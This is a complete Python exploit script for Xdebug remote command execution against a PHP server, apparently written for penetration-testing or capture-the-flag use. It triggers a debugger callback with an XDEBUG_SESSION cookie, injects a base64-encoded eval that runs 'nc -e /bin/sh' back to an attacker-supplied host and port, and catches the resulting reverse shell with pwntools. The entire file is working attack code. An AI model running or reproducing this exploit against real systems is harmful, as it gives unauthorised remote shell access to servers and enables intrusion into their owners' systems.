#!/usr/bin/python3

import socket, requests, sys, argparse, signal, threading, time
from base64 import b64encode
from pwn import *

# Ctrl + c
def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

# Global variables
rhost = ""
lhost = ""
lport = "443"

def makeRequest():
    # Start Listener
    local_ip = "0.0.0.0"
    local_port = 9000

    p1 = log.progress("Payload")
    p1.status("Starting listener on {}:{}".format(local_ip, local_port))
    time.sleep(2)
    sk = socket.socket()
    sk.bind((local_ip, local_port))
    sk.listen(10)
    
    url = "http://{}/index.php".format(rhost)
    try:
        p1.status("Sending request...")
        time.sleep(2)
        r = requests.get(url, headers={"Cookie":"XDEBUG_SESSION=k4miyo"}, timeout=2)
    except:
        pass

    # Catch callback
    conn, addr = sk.accept()
    client_data = conn.recv(1024)
    p1.success("Connection received from {}:{} on port {}".format(addr[0], addr[1], local_port))
    time.sleep(2)
    cmd = 'system("nc -e /bin/sh {} {}")'.format(lhost, lport).encode('utf-8')

    conn.sendall(('eval -i 1 -- %s\x00' % b64encode(cmd).decode('utf-8')).encode('utf-8'))

    sk.close()
    conn.close()

if __name__=="__main__":
    argparser = argparse.ArgumentParser(description='Xdebug Command Execution')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (Victim)',
            required=True)
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    args = argparser.parse_args()
    
    # Variables
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

    shell = listen(lport, timeout=20).wait_for_connection()
    p2 = log.progress("Reverse shell")
    p2.status("Waiting for connection...")
    time.sleep(2)

    if shell.sock is None:
        p2.failure("No connection")
        time.sleep(2)
        sys.exit(1)
    else:
        p2.success("Established connection")
        time.sleep(2)

    shell.interactive()
